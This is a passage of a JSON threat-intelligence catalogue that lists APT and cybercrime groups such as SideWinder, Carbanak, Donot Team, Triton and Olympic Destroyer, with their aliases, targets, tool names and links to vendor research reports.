"attck_id": null, "comment": null}, {"names": ["SideWinder \"Rattlesnake\"", "T-APT-04"], "targets": "Military, Govenment, Pakistan, \"South Asian countries\"", "operations": [], "description": null, "tools": [], "links": ["https://s.tencent.com/research/report/479.html", "https://medium.com/@Sebdraven/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c", "https://www.anomali.com/blog/analyzing-digital-quartermasters-in-asia-do-chinese-and-indian-apts-have-a-shared-supply-chain", "https://blog.trendmicro.com/trendlabs-security-intelligence/first-active-attack-exploiting-cve-2019-2215-found-on-google-play-linked-to-sidewinder-apt-group/ "], "attck_id": null, "comment": "Origins believed to be traced back to 2012"}, {"names": ["Blackgear", "Topgear", "Comnie"], "targets": "Japan, Taiwan, South Korea", "operations": [], "description": null, "tools": ["Protux", "Eliriks"], "links": ["http://blog.trendmicro.com/trendlabs-security-intelligence/blackgear-espionage-campaign-evolves-adds-japan-target-list/", "https://blog.trendmicro.com/trendlabs-security-intelligence/blackgear-cyberespionage-campaign-resurfaces-abuses-social-media-for-cc-communication/", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/"], "attck_id": null, "comment": "Dates back to 2008"}, {"names": ["Gorgon Group", "Subaat", "Aggah"], "targets": null, "operations": [], "description": null, "tools": ["NanoCoreRAT", "QuasarRAT", "NJRAT", "RevengeRat"], "links": ["https://researchcenter.paloaltonetworks.com/2018/08/unit42-gorgon-group-slithering-nation-state-cybercrime/", "https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/", "https://blog.yoroi.company/research/the-evolution-of-aggah-from-roma225-to-the-rg-campaign/", "https://blog.360totalsecurity.com/en/fishing-activities-in-kenya-and-india-by-suspected-gorgon-hacking-organization/", "https://blog.prevailion.com/2019/10/mastermana-botnet.html", "https://blog.prevailion.com/2020/02/the-triune-threat-mastermana-returns.html", "https://medium.com/@paul.k.burbage/aggah-not-exactly-apt-5e51aaff95f5", "https://blog.360totalsecurity.com/en/gorgon-uses-covid-19-outbreak-to-launch-cyber-attacks-on-canada-and-other-regions/"], "attck_id": null, "comment": null}, {"names": ["Donot Team", "APT-C-35", "APTC35", "SectorE02"], "targets": "Government officials, Pakistan, Kashmir", "operations": ["Lucky Elephant"], "description": null, "tools": ["EHDevel", "yty"], "links": ["https://ti.360.net/blog/articles/pakistan-targeted-apt-campaign/", "https://www.reuters.com/article/us-india-cyber-threat/exclusive-india-and-pakistan-hit-by-spy-malware-cybersecurity-firm-idUSKCN1B80Y2", "https://labs.bitdefender.com/wp-content/uploads/downloads/ehdevel-the-story-of-a-continuously-improving-advanced-threat-creation-toolkit/", "https://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/", "https://ti.360.net/blog/articles/latest-activity-of-apt-c-35/", "https://github.com/aptnotes/data/files/679036/Snake.In.The.Grass.-.Python-based.Malware.Used.For.Targeted.Attacks.-.BLUE.COAT.LABS.pdf", "https://ti.360.net/blog/articles/donot-group-is-targeting-pakistani-businessman-working-in-china/", "https://www.netscout.com/blog/asert/lucky-elephant-campaign-masquerading", "https://threatrecon.nshc.net/2019/08/02/sectore02-updates-yty-framework-in-new-targeted-campaign-against-pakistan-government/", "http://blog.ptsecurity.com/2019/11/studying-donot-team.html"], "attck_id": null, "comment": "Possible links to Hangover"}, {"names": ["Nomadic Octopus", "DustSquad"], "targets": "Central Asian users and diplomatic entities", "operations": [], "description": null, "tools": [], "links": ["https://securelist.com/octopus-infested-seas-of-central-asia/88200/"], "attck_id": null, "comment": "Russian-speaking"}, {"names": ["Anunak", "Carbanak", "Carbanak Group", "Carbon Spider"], "targets": "Banks of Russia and payment system", "operations": ["Odinaff"], "description": null, "tools": ["Mimikatz", "MBR Eraser", "SoftPerfect Network Scanner", "SSHd with BackDoor", "Ammy Admin", "CVE-2012-2539 and CVE-2012-0158", "Netscan", "PsExec", "Backdoor Batel", "Bateleur JScript Backdoor", "Cobalt Strike", "Sekur", "Agent ORM", "VB Flash", "JS FLash", "Bateleur"], "links": ["https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf", "http://2014.zeronights.ru/assets/files/slides/ivanovb-zeronights.pdf", "https://www.symantec.com/connect/blogs/odinaff-new-trojan-used-high-level-financial-attacks", "https://www.crowdstrike.com/blog/arrests-put-new-focus-on-carbon-spider-adversary-group/"], "attck_id": null, "comment": "Overlaps with FIN7"}, {"names": ["TA505              (merged w/Indrik Spider)", "Indrik Spider"], "targets": null, "operations": [], "description": null, "tools": [], "links": [], "attck_id": null, "comment": null}, {"names": ["TA544"], "targets": "Online banking, Italy, Poland, Germany, Spain, Japan", "operations": [], "description": null, "tools": ["URLZone", "Ursnif", "Panda Banker", "Nymaim", "Chthonic", "Smoke Loader"], "links": ["https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta544-targets-geographies-italy-japan-range-malware"], "attck_id": null, "comment": null}, {"names": ["TA555"], "targets": "hotel employees, restaurant workers, recruiters for telecom", "operations": [], "description": null, "tools": ["AdvisorsBot", "PoshAdvisor", ""], "links": ["https://www.proofpoint.com/us/threat-insight/post/new-modular-downloaders-fingerprint-systems-part-2-advisorsbot"], "attck_id": null, "comment": "Criminal"}, {"names": ["Blind Eagle", "APT-C-36"], "targets": "Colombian government institutions", "operations": [], "description": null, "tools": ["Imminent RAT"], "links": ["https://ti.360.net/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations-en/", "https://redskyalliance.org/xindustry/apt-c-36-blind-eagle-and-colombia"], "attck_id": null, "comment": null}, {"names": ["Bitter", "APT-C-08", "Manling Flower (Manlinghua)"], "targets": "Pakistan, Saudi Arabia, PRC", "operations": [], "description": null, "tools": ["BitterRAT", "ArtraDownloader", "SlideRAT"], "links": ["https://ti.360.net/blog/articles/analysis-of-targeted-attack-against-pakistan-by-exploiting-inpage-vulnerability-and-related-apt-groups-english/", "https://unit42.paloaltonetworks.com/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/", "https://cert.360.cn/report/detail?id=137867e159331b7a968aa45050502d13", "https://www.anomali.com/blog/suspected-bitter-apt-continues-targeting-government-of-china-and-chinese-organizations#When:19:24:00Z", "https://meltx0r.github.io/tech/2019/09/06/bitter-apt-not-so-sweet.html", "https://meltx0r.github.io/tech/2019/09/09/bitter-apt-not-so-sweet-pt2.html", "http://blogs.360.cn/post/analysis_of_APT_C_08.html"], "attck_id": null, "comment": "ArtraDownloader: earliest timestamp Feb 2015"}, {"names": ["Bahamut"], "targets": "Middle Eastern human rights activists", "operations": [], "description": null, "tools": [], "links": ["https://www.bellingcat.com/news/mena/2017/06/12/bahamut-pursuing-cyber-espionage-actor-middle-east/", "https://www.bellingcat.com/resources/case-studies/2017/10/27/bahamut-revisited-cyber-espionage-middle-east-south-asia/", "https://blog.trendmicro.com/trendlabs-security-intelligence/the-urpage-connection-to-bahamut-confucius-and-patchwork/", "https://blog.talosintelligence.com/2018/07/Mobile-Malware-Campaign-uses-Malicious-MDM.html", "https://blog.talosintelligence.com/2018/07/Mobile-Malware-Campaign-uses-Malicious-MDM-Part2.html"], "attck_id": null, "comment": null}, {"names": ["WindShift"], "targets": "Gulf Cooperation Council", "operations": [], "description": null, "tools": ["WindTail", "WindTape"], "links": ["https://gsec.hitb.org/materials/sg2018/D1%20COMMSEC%20-%20In%20the%20Trails%20of%20WINDSHIFT%20APT%20-%20Taha%20Karim.pdf", "https://objective-see.com/blog/blog_0x38.html", "https://unit42.paloaltonetworks.com/shifting-in-the-wind-windshift-attacks-target-middle-eastern-governments/", "https://digitasecurity.com/blog/2018/12/20/windtail/"], "attck_id": null, "comment": null}, {"names": ["EmpireMonkey", "CobaltGoblin"], "targets": null, "operations": ["Bank of Valletta"], "description": null, "tools": [], "links": ["https://www.timesofmalta.com/articles/view/20190225/local/how-bov-hackers-got-away-with-13-million.702800", "http://blog.morphisec.com/new-global-attack-on-point-of-sale-systems", "https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/"], "attck_id": null, "comment": "Criminal, overlap with FIN7 & Carbanak"}, {"names": ["Pacha Group"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.intezer.com/blog-pacha-group-deploying-undetected-cryptojacking-campaigns/", "https://www.intezer.com/blog-technical-analysis-pacha-group/"], "attck_id": null, "comment": null}, {"names": ["DNSpionage"], "targets": "Lebanon, UAE", "operations": [], "description": null, "tools": [], "links": ["https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html", "https://twitter.com/_CPResearch_/status/1103525899515973632", "https://blog-cert.opmd.fr/dnspionage-weird-apt32-stuff/", "https://blog-cert.opmd.fr/dnspionage-retour-factuel-sur-les-attaques-annoncees-dans-differents-medias/", "https://blog.talosintelligence.com/2019/04/dnspionage-brings-out-karkoff.html"], "attck_id": null, "comment": null}, {"names": ["PLATINUM", "TwoForOne", "DeadlyKiss"], "targets": "primarily targets governmental organizations, defense institutes, intelligence agencies, and telecommunication providers in South and Southeast Asia", "operations": ["Hellsing"], "description": null, "tools": ["Hotpatching techniques", "CVE-2015-2545", "AMT Feature FW evasion"], "links": ["https://blogs.technet.microsoft.com/mmpc/2016/04/26/digging-deep-for-platinum/", "https://threatpost.com/platinum-apt-first-to-abuse-intel-chip-management-feature/126166/", "https://securelist.com/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back/", "http://download.microsoft.com/download/2/2/5/225BFE3E-E1DE-4F5B-A77B-71200928D209/Platinum%20feature%20article%20-%20Targeted%20attacks%20in%20South%20and%20Southeast%20Asia%20April%202016.pdf", "https://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back/", "http://arstechnica.com/security/2015/04/elite-cyber-crime-group-strikes-back-after-attack-by-rival-apt-gang/", "https://www.microsoft.com/security/blog/2017/06/07/platinum-continues-to-evolve-find-ways-to-maintain-invisibility/?source=mmpc", "https://blog.telsy.com/deadlykiss-malware/", "https://securelist.com/titanium-the-platinum-group-strikes-again/"], "attck_id": null, "comment": null}, {"names": ["GreyEnergy Group"], "targets": "Industries: Energy (in Ukraine & Eastern Europe)", "operations": [], "description": null, "tools": ["Maldoc", "GreyEnergy Dropper", "GreyEnergy Min/FELIXROOT"], "links": ["https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf", "https://www.nozominetworks.com/resources/research-paper/greyenergy-dissecting-the-malware-from-maldoc-to-backdoor-2/", "https://github.com/NozomiNetworks/greyenergy-unpacker", "https://www.fireeye.com/blog/threat-research/2018/07/microsoft-office-vulnerabilities-used-to-distribute-felixroot-backdoor.html"], "attck_id": null, "comment": null}, {"names": ["TA516", "SmokingDro"], "targets": null, "operations": [], "description": null, "tools": ["Remocs"], "links": [], "attck_id": null, "comment": null}, {"names": ["TA564", "Captain Cha"], "targets": "Delivered Nymaim to Poland and Danabot to Canada", "operations": [], "description": null, "tools": [], "links": ["https://www2.gov.bc.ca/assets/gov/british-columbians-our-governments/services-policies-for-government/information-management-technology/information-security/global_threat_landscape_-_bc_security_day.pdf"], "attck_id": null, "comment": null}, {"names": ["TA543", "Sagrid"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www2.gov.bc.ca/assets/gov/british-columbians-our-governments/services-policies-for-government/information-management-technology/information-security/global_threat_landscape_-_bc_security_day.pdf"], "attck_id": null, "comment": null}, {"names": ["TA545", "AirCanada"], "targets": null, "operations": [], "description": null, "tools": [" Stealers ZeroEvil and ARS"], "links": ["https://www2.gov.bc.ca/assets/gov/british-columbians-our-governments/services-policies-for-government/information-management-technology/information-security/global_threat_landscape_-_bc_security_day.pdf"], "attck_id": null, "comment": null}]}}, {"unknown": {"actors": [{"names": ["Crouching Yeti"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://securelist.com/blog/research/65240/energetic-bear-more-like-a-crouching-yeti/"], "attck_id": null, "comment": "Links to Energetic Bear"}, {"names": ["NewRomanic Cyber Army Team "], "targets": null, "operations": [], "description": null, "tools": ["Whois Wiper"], "links": ["http://www.mcafee.com/us/resources/white-papers/wp-dissecting-operation-troy.pdf"], "attck_id": null, "comment": null}, {"names": ["The Whois Hacking Team"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["http://www.mcafee.com/us/resources/white-papers/wp-dissecting-operation-troy.pdf"], "attck_id": null, "comment": null}, {"names": ["ItaDuke"], "targets": null, "operations": [], "description": null, "tools": [], "links": [], "attck_id": null, "comment": null}, {"names": ["Roaming Tiger"], "targets": "Gov, Oil and Gas, Aerospace, Defense in UZ, MN, MY, RU, BY, KZ, US, Tibet, UA", "operations": ["Roaming Tiger", "TOPNEWS"], "description": null, "tools": ["SOGU", "GHOST", "TEMPFUN", "FIRSTBLOOD", "PI"], "links": ["http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/", "https://speakerdeck.com/ashley920/into-the-fog-the-return-of-icefog-apt"], "attck_id": null, "comment": null}, {"names": ["Blue Termite", "Emdivi", "Cloudy Omega"], "targets": "This threat actor is believed to have been responsible for the Japan Pension Service incident. It is also known as Emdivi\u00c2\u00a0and Cloudy Omega.", "operations": ["Blue Termite"], "description": null, "tools": ["Emdivi"], "links": ["http://www.kaspersky.com/about/news/virus/2015/Blue-Termite-A-Sophisticated-Cyber-Espionage-Campaign-is-After-High-Profile-Japanese-Targets", "https://web.archive.org/web/20160303010953/http://www.kaspersky.com/about/news/virus/2015/Blue-Termite-A-Sophisticated-Cyber-Espionage-Campaign-is-After-High-Profile-Japanese-Targets", "http://www.symantec.com/connect/blogs/operation-cloudyomega-ichitaro-zero-day-and-ongoing-cyberespionage-campaign-targeting-japan", "http://blog.trendmicro.com/trendlabs-security-intelligence/attackers-target-organizations-in-japan-transform-local-sites-into-cc-servers-for-emdivi-backdoor/"], "attck_id": null, "comment": "Possible link to APT10"}, {"names": ["Suckfly"], "targets": "South Korea, India", "operations": [], "description": null, "tools": ["tcpscan", "smbscan", "wce", "gsecdump", "credentialdumper"], "links": ["http://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates", "http://www.symantec.com/connect/blogs/indian-organizations-targeted-suckfly-attacks"], "attck_id": null, "comment": "Alleged to be China based"}, {"names": ["?"], "targets": null, "operations": ["Groundbait"], "description": null, "tools": ["Win32/Prikormka"], "links": ["http://www.welivesecurity.com/wp-content/uploads/2016/05/Operation-Groundbait.pdf"], "attck_id": null, "comment": null}, {"names": ["SPIVY"], "targets": "Organisations in Hong Kong", "operations": [], "description": null, "tools": ["PoisonIvy", "CVE-2015-2545"], "links": ["http://researchcenter.paloaltonetworks.com/2016/04/unit42-new-poison-ivy-rat-variant-targets-hong-kong-pro-democracy-activists/"], "attck_id": null, "comment": null}, {"names": ["EvilPost"], "targets": "Japanese Defence Sector", "operations": [], "description": null, "tools": ["CVE-2015-2545 "], "links": ["https://www.fireeye.com/blog/threat-research/2015/12/the-eps-awakens-part-two.html"], "attck_id": null, "comment": "C2 Server in Japan"}, {"names": ["Danti"], "targets": "Kazakhstan, Kyrgyzstan, Uzbekistan, Myanmar, Nepal and the Philippines", "operations": [], "description": null, "tools": ["CVE-2015-2545 "], "links": ["https://securelist.com/analysis/publications/74828/cve-2015-2545-overview-of-current-threats/"], "attck_id": null, "comment": "probably related to NetTraveller and DragonOK"}, {"names": ["?"], "targets": "Industrial Control Systems (ICS)", "operations": ["IronGate"], "description": null, "tools": [], "links": ["https://www.fireeye.com/blog/threat-research/2016/06/irongate_ics_malware.html"], "attck_id": null, "comment": "MitM, Sandbox Evasion"}, {"names": ["Evanescent Bat"], "targets": null, "operations": [], "description": null, "tools": [], "links": [], "attck_id": null, "comment": "Tracked by Crowdstrike"}, {"names": ["NewsBeef"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://securelist.com/blog/software/74503/freezer-paper-around-free-meat/"], "attck_id": null, "comment": null}, {"names": ["Poseidon"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://securelist.com/blog/research/73673/poseidon-group-a-targeted-attack-boutique-specializing-in-global-cyber-espionage/"], "attck_id": null, "comment": null}, {"names": ["Ghoul"], "targets": "mainly industrial, engineering and manufacturing organizations in more than 30 countries", "operations": ["Operation Ghoul"], "description": null, "tools": [], "links": ["https://securelist.com/blog/research/75718/operation-ghoul-targeted-attacks-on-industrial-and-engineering-organizations/"], "attck_id": null, "comment": "Financial interests"}, {"names": ["FruityArmor"], "targets": "Middle Eastern region", "operations": [], "description": null, "tools": ["MS16-120 / CVE-2016-3393 0day exploits", "0day CVE-2018-8453", "PowerShell backdoor", "CVE-2018-8611"], "links": ["https://securelist.com/blog/research/76396/windows-zero-day-exploit-used-in-targeted-attacks-by-fruityarmor-apt/", "https://securelist.com/cve-2018-8453-used-in-targeted-attacks/88151/", "https://securelist.com/zero-day-in-windows-kernel-transaction-manager-cve-2018-8611/89253/"], "attck_id": null, "comment": null}, {"names": ["Snake Wine"], "targets": "Japanese Targets", "operations": [], "description": null, "tools": ["Ham Backdoor", "Tofu Backdoor"], "links": ["https://www.cylance.com/en_us/blog/the-deception-project-a-new-japanese-centric-threat.html"], "attck_id": null, "comment": "Tracked by Cylance"}, {"names": ["APT5", "Maganese"], "targets": "Telecommunications and technology companies, particularly in Southeast Asia, as well as high-tech manufacturing firms and military application technology", "operations": [], "description": null, "tools": ["Leouncia"], "links": ["https://www.fireeye.com/current-threats/apt-groups.html", "https://twitter.com/bkMSFT/status/1164881831830929411", "https://www.zdnet.com/article/a-chinese-apt-is-now-going-after-pulse-secure-and-fortinet-vpn-servers/"], "attck_id": null, "comment": null}, {"names": ["Sowbug"], "targets": "South American and Southeast Asian governments", "operations": [], "description": null, "tools": ["Felismus"], "links": ["https://www.symantec.com/connect/blogs/sowbug-cyber-espionage-group-targets-south-american-and-southeast-asian-governments"], "attck_id": null, "comment": "Tracked by Symantec"}, {"names": ["Triton", "TRISIS"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://ics-cert.us-cert.gov/MAR-17-352-01-HatMan%E2%80%94Safety-System-Targeted-Malware", "https://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html", "https://www.fireeye.com/blog/threat-research/2018/10/triton-attribution-russian-government-owned-lab-most-likely-built-tools.html"], "attck_id": null, "comment": null}, {"names": ["?"], "targets": "Winter Olympics in Pyeongchang, South Korea; adversaries looking for information from the games but instead they are aimed to disrupt the games", "operations": ["Olympic Destroyer"], "description": null, "tools": ["Olympic Destroyer (destructive malware)", "PsExec"], "links": ["http://blog.talosintelligence.com/2018/02/olympic-destroyer.html", "https://www.recordedfuture.com/olympic-destroyer-malware/", "http://www.intezer.com/2018-winter-cyber-olympics-code-similarities-cyber-attacks-pyeongchang/", "https://www.endgame.com/blog/technical-blog/stopping-olympic-destroyer-new-process-injection-insights", "https://securelist.com/olympicdestroyer-is-here-to-trick-the-industry/84295/", "https://securelist.com/the-devils-in-the-rich-header/84348/", "https://blog.talosintelligence.com/2018/02/who-wasnt-responsible-for-olympic.html", "https://research.checkpoint.com/new-strain-of-olympic-destroyer-droppers/"], "attck_id": null, "comment": "Highly sophisticated false flag"}, {"names": ["Orangeworm"], "targets": "Known victims include healthcare providers, pharmaceuticals, IT solution providers for healthcare and equipment manufacturers that serve the healthcare industry, likely for the purpose of corporate espionage", "operations": [], "description": null, "tools": ["Kwampirs backdoor"], "links": ["https://www.symantec.com/blogs/threat-intelligence/orangeworm-targets-healthcare-us-europe-asia", "https://www.databreaches.net/team-orangeworm-claims-to-be-dumping-carepartners-data-from-2018-breach/", "https://www.databreaches.net/team_orangeworm-issues-new-threats-to-carepartners/", "https://lab52.io/blog/orangeworm-group-kwampirs-analysis-update/", "https://blog.reversinglabs.com/blog/unpacking-kwampirs-rat"], "attck_id": null, "comment": "Possibly FIN10 Tracked by Symantec cybercriminal"}, {"names": ["FIN10"], "targets": "Casinos and mining (natural resources)", "operations": [], "description": null, "tools": [], "links": ["https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin10.pdf"], "attck_id": null, "comment": "cybercriminal"}, {"names": ["BlackTech"], "targets": "targets in East Asia, particularly Taiwan, and occasionally, Japan and Hong Kong", "operations": ["PLEAD", "Shrouded Crossbow", "Waterbear"], "description": null, "tools": [], "links": ["https://blog.trendmicro.com/trendlabs-security-intelligence/following-trail-blacktech-cyber-espionage-campaigns/", "https://documents.trendmicro.com/assets/appendix-following-the-trail-of-blacktechs-cyber-espionage-campaigns.pdf", "https://blogs.jpcert.or.jp/en/2018/03/malware-tscooki-7aa0.html", "https://blog.jpcert.or.jp/2018/06/plead-downloader-used-by-blacktech.html", "https://www.welivesecurity.com/2018/07/09/certificates-stolen-taiwanese-tech-companies-plead-malware-campaign/", "https://www.welivesecurity.com/2019/05/14/plead-malware-mitm-asus-webstorage/", "https://blogs.jpcert.or.jp/en/2019/09/tscookie-loader.html", "https://blogs.jpcert.or.jp/en/2019/11/icondown-downloader-used-by-blacktech.html", "https://blog.trendmicro.com/trendlabs-security-intelligence/waterbear-is-back-uses-api-hooking-to-evade-security-product-detection/"], "attck_id": null, "comment": "\"PLEAD\" and Waterbear labels apply to actors, malware and operations"}, {"names": ["White Company"], "targets": "Pakistani government and military \u00e2\u0080\u0094 in particular, the Pakistani Air Force", "operations": ["Shaheen"], "description": null, "tools": [], "links": ["https://threatvector.cylance.com/en_us/home/the-white-company-inside-the-operation-shaheen-espionage-campaign.html"], "attck_id": null, "comment": null}, {"names": ["Silence Group"], "targets": "Targets are located in Eastern Europe and Russia", "operations": [], "description": null, "tools": ["Malicious CHM files", "Truebot"], "links": ["https://reaqta.com/2019/01/silence-group-targeting-russian-banks/", "https://www.group-ib.com/media/silence/", "https://www.group-ib.com/resources/threat-research/silence_moving-into-the-darkside.pdf", "https://www.group-ib.com/resources/threat-research/silence_2.0.going_global.pdf", "https://www.group-ib.com/media/silence_ta505_attacks_in_europe/"], "attck_id": null, "comment": null}, {"names": ["Whitefly"], "targets": "Healthcare, media, telecommunications, and engineering sectors. Singapore", "operations": ["SingHealth"], "description": null, "tools": ["CVE-2016-0051", "Vcrodat", "Nibatad", "Termite", "Mimikatz"], "links": ["https://www.symantec.com/blogs/threat-intelligence/whitefly-espionage-singapore"], "attck_id": null, "comment": "Has been seen targeting organisations based in Singaport and additionally some multinational organizations with a presence in Singapore."}, {"names": ["Roaming Mantis", "Shaoye"], "targets": "Russia, Japan, India, Bangladesh, Kazakhstan, Azerbaijan, Iran and Vietnam", "operations": [], "description": null, "tools": ["malicious APK"], "links": ["https://securelist.com/it-threat-evolution-q2-2019/91994/", "https://securelist.com/roaming-mantis-uses-dns-hijacking-to-infect-android-smartphones/85178/", "https://securelist.com/roaming-mantis-dabbles-in-mining-and-phishing-multilingually/85607/", "https://securelist.com/roaming-mantis-part-3/88071/", "https://securelist.com/roaming-mantis-part-iv/90332/", "https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/moqhao-related-android-spyware-targeting-japan-and-korea-found-on-google-play/"], "attck_id": null, "comment": null}, {"names": ["LYCEUM", "HEXANE"], "targets": "Middle East, Kuwait, South Africa", "operations": [], "description": null, "tools": ["DanBot", "DanDrop", "Invoke-Obfuscation", "PowerShell", "PoshC2"], "links": ["https://www.secureworks.com/blog/lyceum-takes-center-stage-in-middle-east-campaign", "https://dragos.com/resource/hexane/"], "attck_id": null, "comment": "Most likely Iranian group"}, {"names": ["APT-C-37", "Papa Bear"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["http://blogs.360.cn/post/analysis-of-apt-c-37.html", "https://zhuanlan.kanxue.com/article-8168.htm", "https://mp.weixin.qq.com/s/lUtXwWjPVMHXfR6oLnXYhQ", "https://cybersecurity.att.com/blogs/labs-research/alien-labs-2019-analysis-of-threat-groups-molerats-and-apt-c-37"], "attck_id": null, "comment": null}, {"names": ["APT-C-38", "Saber Lion", "ZooPark"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["http://blogs.360.cn/post/analysis-of-APT-C-38.html"], "attck_id": null, "comment": null}, {"names": ["Storm Cloud"], "targets": "Tibetan Community", "operations": [], "description": null, "tools": ["BRAINDAMAGE", "GOSLU", "STITCH", "PLUGDAT"], "links": ["https://www.volexity.com/blog/2020/03/31/storm-cloud-unleashed-tibetan-community-focus-of-highly-targeted-fake-flash-campaign/"], "attck_id": null, "comment": "Likely a Chinese group"}]}}, null, null, {}, null]}
